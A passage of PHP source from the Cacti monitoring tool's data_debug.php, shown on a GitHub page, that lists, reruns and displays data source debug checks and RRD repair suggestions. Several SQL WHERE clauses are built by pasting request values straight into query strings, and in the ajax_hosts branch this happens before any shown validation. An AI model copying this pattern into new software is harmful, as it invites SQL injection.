 if ($debug\_status == 'waiting' || $debug\_status == 'analysis') { $refresh = array( 'seconds' => 30, 'page' => 'data\_debug.php?action=view&id=' . $id, 'logout' => 'false' );
 set\_page\_refresh($refresh); }
 top\_header(); debug\_view(); bottom\_footer();
 break; case 'ajax\_hosts': $sql\_where = '';
 if (get\_request\_var('site\_id') > 0) { $sql\_where = 'site\_id = ' . get\_request\_var('site\_id'); }
 get\_allowed\_ajax\_hosts(true, 'applyFilter', $sql\_where);
 break; case 'ajax\_hosts\_noany': $sql\_where = '';
 if (get\_request\_var('site\_id') > 0) { $sql\_where = 'site\_id = ' . get\_request\_var('site\_id'); }
 get\_allowed\_ajax\_hosts(false, 'applyFilter', $sql\_where);
 break; case 'runall': debug\_runall\_filtered();
 default: $refresh = array( 'seconds' => get\_request\_var('refresh'), 'page' => 'data\_debug.php', 'logout' => 'false' );
 set\_page\_refresh($refresh);
 top\_header(); debug\_wizard(); bottom\_footer();
 break;}
function debug\_runall\_filtered() { $info = array( 'rrd\_folder\_writable' => '', 'rrd\_exists' => '', 'rrd\_writable' => '', 'active' => '', 'owner' => '', 'runas\_poller' => '', 'runas\_website' => get\_running\_user(), 'last\_result' => '', 'valid\_data' => '', 'rra\_timestamp' => '', 'rra\_timestamp2' => '', 'rrd\_match' => '' );
 $info = serialize($info);
 $sql\_where = ''; $dd\_join = ''; $now = time();
 debug\_get\_filter($sql\_where, $dd\_join);
 db\_execute("DELETE dd FROM data\_debug AS dd INNER JOIN data\_local AS dl ON dd.datasource = dl.id INNER JOIN data\_template\_data AS dtd ON dl.id=dtd.local\_data\_id INNER JOIN data\_template AS dt ON dt.id=dl.data\_template\_id INNER JOIN host AS h ON h.id = dl.host\_id $sql\_where");
 db\_execute\_prepared("INSERT INTO data\_debug (started, done, info, user, datasource) SELECT ?, '0', ?, ?, dl.id FROM data\_local AS dl INNER JOIN data\_template\_data AS dtd ON dl.id=dtd.local\_data\_id INNER JOIN data\_template AS dt ON dt.id=dl.data\_template\_id INNER JOIN host AS h ON h.id = dl.host\_id $sql\_where", array($now, $info, $\_SESSION[SESS\_USER\_ID]));}
function debug\_process\_status($id) { $status = db\_fetch\_row\_prepared('SELECT done, IFNULL(issue, "waiting") AS issue FROM data\_debug WHERE datasource = ?', array($id));
 if (cacti\_sizeof($status) == 0) { return 'notset'; }
 if ($status['issue'] == 'waiting') { return 'waiting'; }
 if ($status['done'] == 1) { return 'complete'; } else { return 'analysis'; }}
function form\_actions() { global $actions, $assoc\_actions;
 /\* ================= input validation ================= \*/ get\_filter\_request\_var('id'); get\_filter\_request\_var('drp\_action', FILTER\_VALIDATE\_REGEXP, array('options' => array('regexp' => '/^([a-zA-Z0-9\_]+)$/'))); /\* ================= input validation ================= \*/
 $selected\_items = array();
 if (isset\_request\_var('save\_list')) { /\* loop through each of the lists selected on the previous page and get more info about them \*/ foreach ($\_POST as $var=>$val) { if (preg\_match('/^chk\_([0-9]+)$/', $var, $matches)) { /\* ================= input validation ================= \*/ input\_validate\_input\_number($matches[1], 'chk[1]'); /\* ==================================================== \*/
 $selected\_items[] = $matches[1]; } }
 /\* if we are to save this form, instead of display it \*/ if (isset\_request\_var('save\_list')) { if (get\_request\_var('drp\_action') == '2') { /\* delete \*/ debug\_delete($selected\_items); header('Location: data\_debug.php?debug=-1'); } elseif (get\_request\_var('drp\_action') == '1') { /\* Rerun \*/ debug\_rerun($selected\_items); header('Location: data\_debug.php?debug=1'); }
 exit; } }}
function debug\_rerun($selected\_items) { $info = array( 'rrd\_folder\_writable' => '', 'rrd\_exists' => '', 'rrd\_writable' => '', 'active' => '', 'owner' => '', 'runas\_poller' => '', 'runas\_website' => get\_running\_user(), 'last\_result' => '', 'valid\_data' => '', 'rra\_timestamp' => '', 'rra\_timestamp2' => '', 'rrd\_match' => '' );
 $info = serialize($info);
 if (!empty($selected\_items)) { foreach ($selected\_items as $id) { $exists = db\_fetch\_cell\_prepared('SELECT id FROM data\_debug WHERE datasource = ?', array($id));
 if (!$exists) { $save = array(); $save['id'] = 0; $save['datasource'] = $id;
 $save['info'] = $info; $save['started'] = time(); $save['user'] = intval($\_SESSION[SESS\_USER\_ID]);
 $id = sql\_save($save, 'data\_debug'); } else { $stime = time();
 db\_execute\_prepared('UPDATE data\_debug SET started = ?, done = 0, info = ?, issue = "" WHERE id = ?', array($stime, $info, $exists)); } } }}
function debug\_delete($selected\_items) { if (!empty($selected\_items)) { foreach ($selected\_items as $id) { db\_execute\_prepared('DELETE FROM data\_debug WHERE datasource = ?', array($id)); } }}
function validate\_request\_vars() { /\* ================= input validation and session storage ================= \*/ $filters = array( 'rows' => array( 'filter' => FILTER\_VALIDATE\_INT, 'pageset' => true, 'default' => '-1' ), 'refresh' => array( 'filter' => FILTER\_VALIDATE\_INT, 'default' => '60' ), 'page' => array( 'filter' => FILTER\_VALIDATE\_INT, 'default' => '1' ), 'rfilter' => array( 'filter' => FILTER\_VALIDATE\_IS\_REGEX, 'pageset' => true, 'default' => '', 'options' => array('options' => 'sanitize\_search\_string') ), 'sort\_column' => array( 'filter' => FILTER\_CALLBACK, 'default' => 'name\_cache', 'options' => array('options' => 'sanitize\_search\_string') ), 'sort\_direction' => array( 'filter' => FILTER\_CALLBACK, 'default' => 'ASC', 'options' => array('options' => 'sanitize\_search\_string') ), 'site\_id' => array( 'filter' => FILTER\_VALIDATE\_INT, 'default' => '-1', 'pageset' => true, ), 'host\_id' => array( 'filter' => FILTER\_VALIDATE\_INT, 'default' => '-1', 'pageset' => true, ), 'template\_id' => array( 'filter' => FILTER\_VALIDATE\_INT, 'default' => '-1', 'pageset' => true, ), 'status' => array( 'filter' => FILTER\_VALIDATE\_INT, 'pageset' => true, 'default' => '-1' ), 'profile' => array( 'filter' => FILTER\_VALIDATE\_INT, 'pageset' => true, 'default' => '-1' ), 'debug' => array( 'filter' => FILTER\_VALIDATE\_INT, 'default' => '-1', 'pageset' => true, ) );
 validate\_store\_request\_vars($filters, 'sess\_dd'); /\* ================= input validation ================= \*/}
function debug\_get\_filter(&$sql\_where, &$dd\_join) { /\* form the 'where' clause for our main sql query \*/ if (get\_request\_var('rfilter') != '') { $sql\_where = "WHERE (dtd.name\_cache RLIKE '" . get\_request\_var('rfilter') . "'" . " OR dtd.local\_data\_id RLIKE '" . get\_request\_var('rfilter') . "'" . " OR dt.name RLIKE '" . get\_request\_var('rfilter') . "')"; } else { $sql\_where = ''; }
 if (get\_request\_var('host\_id') == '-1') { /\* Show all items \*/ } elseif (isempty\_request\_var('host\_id')) { $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' (dl.host\_id=0 OR dl.host\_id IS NULL)'; } elseif (!isempty\_request\_var('host\_id')) { $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' dl.host\_id=' . get\_request\_var('host\_id'); }
 if (get\_request\_var('site\_id') == '-1') { /\* Show all items \*/ } elseif (isempty\_request\_var('site\_id')) { $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' (h.site\_id=0 OR h.site\_id IS NULL)'; } elseif (!isempty\_request\_var('site\_id')) { $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' h.site\_id=' . get\_request\_var('site\_id'); }
 if (get\_request\_var('template\_id') == '-1') { /\* Show all items \*/ } elseif (get\_request\_var('template\_id') == '0') { $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' dtd.data\_template\_id=0'; } elseif (!isempty\_request\_var('template\_id')) { $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' dtd.data\_template\_id=' . get\_request\_var('template\_id'); }
 if (get\_request\_var('profile') == '-1') { /\* Show all items \*/ } else { $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' dtd.data\_source\_profile\_id=' . get\_request\_var('profile'); }
 if (get\_request\_var('status') == '-1') { /\* Show all items \*/ } elseif (get\_request\_var('status') == '0') { $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' dd.issue != ""'; } elseif (get\_request\_var('status') == '1') { $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' dtd.active="on"'; } else { $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' dtd.active=""'; }
 if (get\_request\_var('debug') == '-1') { $dd\_join = 'LEFT'; } elseif (get\_request\_var('debug') == 0) { $dd\_join = 'LEFT'; $sql\_where .= ($sql\_where != '' ? ' AND':'WHERE') . ' dd.datasource IS NULL'; } else { $dd\_join = 'INNER'; }
 // Get the SQL Where and Join}
function debug\_wizard() { global $actions;
 $display\_text = array( 'name\_cache' => array( 'display' => \_\_('Data Source'), 'sort' => 'ASC', 'tip' => \_\_('The Data Source to Debug'), ), 'username' => array( 'display' => \_\_('User'), 'sort' => 'ASC', 'tip' => \_\_('The User who requested the Debug.'), ), 'started' => array( 'display' => \_\_('Started'), 'sort' => 'DESC', 'align' => 'right', 'tip' => \_\_('The Date that the Debug was Started.'), ), 'local\_data\_id' => array( 'display' => \_\_('ID'), 'sort' => 'ASC', 'align' => 'right', 'tip' => \_\_('The Data Source internal ID.'), ), 'nosort1' => array( 'display' => \_\_('Status'), 'sort' => 'ASC', 'align' => 'center', 'tip' => \_\_('The Status of the Data Source Debug Check.'), ), 'nosort2' => array( 'display' => \_\_('Writable'), 'align' => 'center', 'sort' => '', 'tip' => \_\_('Determines if the Data Collector or the Web Site have Write access.'), ), 'nosort3' => array( 'display' => \_\_('Exists'), 'align' => 'center', 'sort' => '', 'tip' => \_\_('Determines if the Data Source is located in the Poller Cache.'), ), 'nosort4' => array( 'display' => \_\_('Active'), 'align' => 'center', 'sort' => '', 'tip' => \_\_('Determines if the Data Source is Enabled.'), ), 'nosort5' => array( 'display' => \_\_('RRD Match'), 'align' => 'center', 'sort' => '', 'tip' => \_\_('Determines if the RRDfile matches the Data Source Template.'), ), 'nosort6' => array( 'display' => \_\_('Valid Data'), 'align' => 'center', 'sort' => '', 'tip' => \_\_('Determines if the RRDfile has been getting good recent Data.'), ), 'nosort7' => array( 'display' => \_\_('RRD Updated'), 'align' => 'center', 'sort' => '', 'tip' => \_\_('Determines if the RRDfile has been written to properly.'), ), 'nosort8' => array( 'display' => \_\_('Issues'), 'align' => 'right', 'sort' => '', 'tip' => \_\_('Summary of issues found for the Data Source.'), ) );
 if (isset\_request\_var('purge')) { db\_execute('TRUNCATE TABLE data\_debug'); }
 /\* fill in the current date for printing in the log \*/ if (defined('CACTI\_DATE\_TIME\_FORMAT')) { $datefmt = CACTI\_DATE\_TIME\_FORMAT; } else { $datefmt = 'Y-m-d H:i:s'; }
 data\_debug\_filter();
 $total\_rows = 0; $checks = array();
 if (get\_request\_var('rows') == '-1') { $rows = read\_config\_option('num\_rows\_table'); } else { $rows = get\_request\_var('rows'); }
 $sql\_where = ''; $dd\_join = '';
 debug\_get\_filter($sql\_where, $dd\_join);
 $total\_rows = db\_fetch\_cell("SELECT COUNT(\*) FROM data\_local AS dl INNER JOIN data\_template\_data AS dtd ON dl.id=dtd.local\_data\_id INNER JOIN data\_template AS dt ON dt.id=dl.data\_template\_id INNER JOIN host AS h ON h.id = dl.host\_id $dd\_join JOIN data\_debug AS dd ON dl.id = dd.datasource $sql\_where");
 $sql\_order = get\_order\_string(); $sql\_limit = ' LIMIT ' . ($rows \* (get\_request\_var('page') - 1)) . ',' . $rows;
 $checks = db\_fetch\_assoc("SELECT dd.\*, dtd.local\_data\_id, dtd.name\_cache, u.username FROM data\_local AS dl INNER JOIN data\_template\_data AS dtd ON dl.id=dtd.local\_data\_id INNER JOIN data\_template AS dt ON dt.id=dl.data\_template\_id INNER JOIN host AS h ON h.id = dl.host\_id $dd\_join JOIN data\_debug AS dd ON dl.id = dd.datasource LEFT JOIN user\_auth AS u ON u.id = dd.user $sql\_where $sql\_order $sql\_limit");
 $nav = html\_nav\_bar('data\_debug.php', MAX\_DISPLAY\_PAGES, get\_request\_var('page'), $rows, $total\_rows, cacti\_sizeof($display\_text) + 1, \_\_('Data Sources'), 'page', 'main');
 form\_start('data\_debug.php', 'chk');
 print $nav;
 html\_start\_box('', '100%', '', '3', 'center', '');
 html\_header\_sort\_checkbox($display\_text, get\_request\_var('sort\_column'), get\_request\_var('sort\_direction'), false);
 if (cacti\_sizeof($checks)) { foreach ($checks as $check) { if (isset($check['info']) && $check['info'] != '') { $info = cacti\_unserialize($check['info']); } else { $info = ''; }
 if (isset($check['issue']) && $check['issue'] != '') { $issues = explode("\n", $check['issue']); } else { $issues = array(); }
 $iline = '';
 if (cacti\_sizeof($issues)) { $iline = $issues[0]; }
 $issue\_title = implode('<br/>',$issues);
 form\_alternate\_row('line' . $check['local\_data\_id']);
 form\_selectable\_cell(filter\_value(title\_trim($check['name\_cache'], read\_config\_option('max\_title\_length')), get\_request\_var('rfilter'), 'data\_debug.php?action=view&id=' . $check['local\_data\_id']), $check['local\_data\_id']);
 if (!empty($check['datasource'])) { form\_selectable\_ecell($check['username'], $check['local\_data\_id']); form\_selectable\_cell(date($datefmt, $check['started']), $check['local\_data\_id'], '', 'right'); form\_selectable\_cell($check['local\_data\_id'], $check['local\_data\_id'], '', 'right'); form\_selectable\_cell(debug\_icon(($check['done'] ? ($iline != '' ? 'off' : 'on'):'')), $check['local\_data\_id'], '', 'center'); form\_selectable\_cell(debug\_icon($info['rrd\_writable']), $check['local\_data\_id'], '', 'center'); form\_selectable\_cell(debug\_icon($info['rrd\_exists']), $check['local\_data\_id'], '', 'center'); form\_selectable\_cell(debug\_icon($info['active']), $check['local\_data\_id'], '', 'center'); form\_selectable\_cell(debug\_icon($info['rrd\_match']), $check['local\_data\_id'], '', 'center'); form\_selectable\_cell(debug\_icon($info['valid\_data']), $check['local\_data\_id'], '', 'center');
 if ($check['done'] && $info['rrd\_writable'] == '') { form\_selectable\_cell(debug\_icon('blah'), $check['local\_data\_id'], '', 'center'); } else { form\_selectable\_cell(debug\_icon(($info['rra\_timestamp2'] != '' ? 1 : '')), $check['local\_data\_id'], '', 'center'); }
 form\_selectable\_cell('<a class=\'linkEditMain\' href=\'#\' title="' . html\_escape($issue\_title) . '">' . ($iline != '' ? \_\_esc('Issues') : \_\_esc('N/A')) . '</a>', $check['local\_data\_id'], '', 'right'); } else { form\_selectable\_cell('-', $check['local\_data\_id']); form\_selectable\_cell(\_\_('Not Debugging'), $check['local\_data\_id'], '', 'right'); form\_selectable\_cell($check['local\_data\_id'], $check['local\_data\_id'], '', 'right'); form\_selectable\_cell('-', $check['local\_data\_id'], '', 'center'); form\_selectable\_cell('-', $check['local\_data\_id'], '', 'center'); form\_selectable\_cell('-', $check['local\_data\_id'], '', 'center'); form\_selectable\_cell('-', $check['local\_data\_id'], '', 'center'); form\_selectable\_cell('-', $check['local\_data\_id'], '', 'center'); form\_selectable\_cell('-', $check['local\_data\_id'], '', 'center'); form\_selectable\_cell('-', $check['local\_data\_id'], '', 'center'); form\_selectable\_cell('-', $check['local\_data\_id'], '', 'right'); }
 form\_checkbox\_cell($check['local\_data\_id'], $check['local\_data\_id']); form\_end\_row(); } } else { print "<tr><td colspan='" . (cacti\_sizeof($display\_text) + 1) . "'><em>" . \_\_('No Checks') . '</em></td></tr>'; }
 html\_end\_box(false);
 if (cacti\_sizeof($checks)) { print $nav; }
 form\_hidden\_box('save\_list', '1', '');
 /\* draw the dropdown containing a list of available actions for this form \*/ draw\_actions\_dropdown($actions);
 form\_end();}
function debug\_view() { global $config, $refresh;
 $refresh = 60;
 $id = get\_filter\_request\_var('id');
 $check = db\_fetch\_row\_prepared('SELECT \* FROM data\_debug WHERE datasource = ?', array($id));
 $check\_exists = cacti\_sizeof($check);
 if (isset($check) && is\_array($check)) { $check['info'] = cacti\_unserialize($check['info']); }
 $dtd = db\_fetch\_row\_prepared('SELECT \* FROM data\_template\_data WHERE local\_data\_id = ?', array($id));
 if (cacti\_sizeof($dtd)) { $real\_path = str\_replace('<path\_rra>', CACTI\_PATH\_RRA, $dtd['data\_source\_path']); } else { $real\_path = \_\_('Not Found'); }
 $poller\_data = array();
 if (!empty($check['info']['last\_result'])) { foreach ($check['info']['last\_result'] as $a => $l) { $poller\_data[] = "$a = $l"; } } $poller\_data = implode('<br>', $poller\_data);
 $rra\_updated = '';
 if (isset($check['info']['rra\_timestamp2'])) { $rra\_updated = $check['info']['rra\_timestamp2'] != '' ? \_\_('Yes') : ''; }
 $rrd\_exists = '';
 if (isset($check['info']['rrd\_exists'])) { $rrd\_exists = $check['info']['rrd\_exists'] == '1' ? \_\_('Yes') : \_\_('Not Checked Yet'); }
 $active = '';
 if (isset($check['info']['active'])) { $active = $check['info']['active'] == 'on' ? \_\_('Yes') : \_\_('Not Checked Yet'); }
 $issue = '';
 if (isset($check['issue'])) { $issue = $check['issue']; }
 if ($check['done'] == 1) { if ($issue != '') { $issue\_icon = debug\_icon(0); } else { $issue\_icon = debug\_icon(1); } } else { if (isset($check['info']['rrd\_match\_array']['ds'])) { if ($check['info']['rrd\_match'] == 0) { $issue\_icon = debug\_icon('blah'); $issue = \_\_('Issues found! Waiting on RRDfile update'); } else { $issue\_icon = debug\_icon(''); $issue = \_\_('No Initial found! Waiting on RRDfile update'); } } else { $issue\_icon = debug\_icon(''); $issue = \_\_('Waiting on analysis and RRDfile update'); } }
 $fields = array( array( 'name' => 'owner', 'title' => \_\_('RRDfile Owner'), 'icon' => '-' ), array( 'name' => 'runas\_website', 'title' => \_\_('Website runs as'), 'icon' => '-' ), array( 'name' => 'runas\_poller', 'title' => \_\_('Poller runs as'), 'icon' => '-' ), array( 'name' => 'rrd\_folder\_writable', 'title' => \_\_('Is RRA Folder writeable by poller?'), 'value' => dirname($real\_path) ), array( 'name' => 'rrd\_writable', 'title' => \_\_('Is RRDfile writeable by poller?'), 'value' => $real\_path ), array( 'name' => 'rrd\_exists', 'title' => \_\_('Does the RRDfile Exist?'), 'value' => $rrd\_exists ), array( 'name' => 'active', 'title' => \_\_('Is the Data Source set as Active?'), 'value' => $active ), array( 'name' => 'last\_result', 'title' => \_\_('Did the poller receive valid data?'), 'value' => $poller\_data ), array( 'name' => 'rra\_updated', 'title' => \_\_('Was the RRDfile updated?'), 'value' => '', 'icon' => $rra\_updated ), array( 'name' => 'rra\_timestamp', 'title' => \_\_('First Check TimeStamp'), 'icon' => '-' ), array( 'name' => 'rra\_timestamp2', 'title' => \_\_('Second Check TimeStamp'), 'icon' => '-' ), array( 'name' => 'convert\_name', 'title' => \_\_('Were we able to convert the title?'), 'value' => html\_escape(get\_data\_source\_title($check['datasource'])) ), array( 'name' => 'rrd\_match', 'title' => \_\_('Data Source matches the RRDfile?'), 'value' => '' ), array( 'name' => 'issue', 'title' => \_\_('Issues'), 'value' => $issue, 'icon' => $issue\_icon ), );
 $debug\_status = debug\_process\_status($id);
 if ($debug\_status == 'waiting') { html\_start\_box(\_\_('Data Source Troubleshooter [ Auto Refreshing till Complete ] %s', '<i class="reloadquery fa fa-sync" data-id="' . $id . '" title="' . \_\_esc('Refresh Now') . '"></i>'), '100%', '', '3', 'center', ''); } elseif ($debug\_status == 'analysis') { html\_start\_box(\_\_('Data Source Troubleshooter [ Auto Refreshing till RRDfile Update ] %s', '<i class="reloadquery fa fa-sync" data-id="' . $id . '" title="' . \_\_esc('Refresh Now') . '"></i>'), '100%', '', '3', 'center', ''); } else { html\_start\_box(\_\_('Data Source Troubleshooter [ Analysis Complete! %s ]', '<a href="#" class="rerun linkEditMain" data-id="' . $id . '" style="cursor:pointer;">' . \_\_('Rerun Analysis') . '</a>'), '100%', '', '3', 'center', ''); }
 html\_header( array( \_\_('Check'), \_\_('Value'), \_\_('Results') ) );
 $i = 1;
 foreach ($fields as $field) { $field\_name = $field['name'];
 form\_alternate\_row('line' . $i); form\_selectable\_ecell($field['title'], $i);
 $value = \_\_('<not set>'); $icon = '';
 if (array\_key\_exists($field\_name, $check['info'])) { $value = $check['info'][$field\_name];
 if ($field\_name == 'last\_result') { $icon = debug\_icon\_valid\_result($value); } else { $icon = debug\_icon($value); } }
 if (array\_key\_exists('value', $field)) { $value = html\_escape($field['value']); }
 if (array\_key\_exists('icon', $field)) { $icon = $field['icon']; }
 $value\_title = $value;
 if (strlen($value) > 100) { $value = substr($value, 0, 100); }
 form\_selectable\_cell($value, $i, '', '', $value\_title); form\_selectable\_cell($icon, $i);
 form\_end\_row(); $i++; }
 html\_end\_box();
 if ($check\_exists > 0 && isset($check['info']['rrd\_match\_array']['ds']) && $check['info']['rrd\_match'] == 0) { html\_start\_box(\_\_('Data Source Repair Recommendations'), '', '', '2', 'center', '');
 html\_header( array( \_\_('Data Source'), \_\_('Issue') ) );
 if (isset($check['info']['rrd\_match\_array']['ds'])) { $i = 0;
 foreach ($check['info']['rrd\_match\_array']['ds'] as $data\_source => $details) { form\_alternate\_row('line2\_' . $i, true); form\_selectable\_cell($data\_source, $i);
 $output = '';
 foreach ($details as $attribute => $recommendation) { $output .= \_\_('For attribute \'%s\', issue found \'%s\'', $attribute, $recommendation); }
 form\_selectable\_cell($output, 'line\_2' . $i); form\_end\_row(); $i++; } }
 html\_end\_box();
 if (isset($check['info']['rrd\_match\_array']['tune'])) { $path = get\_data\_source\_path($id, true);
 if (is\_writeable($path)) { html\_start\_box(\_\_('Repair Steps [ %s ]', '<a href="#" class="repairme linkEditMain" data-id="' . $id . '" style="cursor:pointer;">' . \_\_('Apply Suggested Fixes') . '</a>'), '', '', '2', 'center', ''); } else { html\_start\_box(\_\_('Repair Steps [ Run Fix from Command Line ]', $path), '', '', '2', 'center', ''); }
 html\_header(array(\_\_('Command'))); $rrdtool\_path = read\_config\_option('path\_rrdtool');
 $i = 0;
 foreach ($check['info']['rrd\_match\_array']['tune'] as $options) { form\_alternate\_row('line3\_' . $i, true); form\_selectable\_cell($rrdtool\_path . ' tune ' . $options, 'line3\_' . $i); form\_end\_row(); $i++; }
 html\_end\_box(); } } else { html\_start\_box(\_\_('Data Source Repair Recommendations'), '', '', '2', 'center', ''); form\_alternate\_row('line3\_0', true); form\_selectable\_cell(\_\_('Waiting on Data Source Check to Complete'), 'line3\_0'); form\_end\_row(); html\_end\_box(); }
 ?> <script type='text/javascript'> $(function() { $('.repairme').click(function(event) { event.preventDefault(); id = $(this).attr('data-id'); loadUrl({url:'data\_debug.php?action=run\_repair&id=' + id}) });
 $('.reloadquery').click(function() { id = $(this).attr('data-id'); loadUrl({url:'data\_debug.php?action=view&id=' + id}) });
 $('.rerun').click(function(event) { event.preventDefault(); id = $(this).attr('data-id'); loadUrl({url:'data\_debug.php?action=run\_debug&id=' + id}) }); }); </script> <?php}
function debug\_icon\_valid\_result($result) { if ($result === '' || $result === false) { return '<i class="fa fa-spinner fa-pulse fa-fw"></i>'; }
 if ($result === '-') { return '<i class="fa fa-info-circle"></i>'; }
 if (is\_array($result)) { foreach ($result as $variable => $value) { if (!prepare\_validate\_result($value)) { return '<i class="fa fa-times" style="color:red"></i>'; } }
 return '<i class="fa fa-check" style="color:green"></i>'; }
 if (prepare\_validate\_result($result)) { return '<i class="fa fa-check" style="color:green"></i>'; } else { return '<i class="fa fa-times" style="color:red"></i>'; }}[View remainder of file in raw view](https://github.com/Cacti/cacti/raw/5f6f65c215d663a775950b2d9db35edbaf07d680/data_debug.php)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.


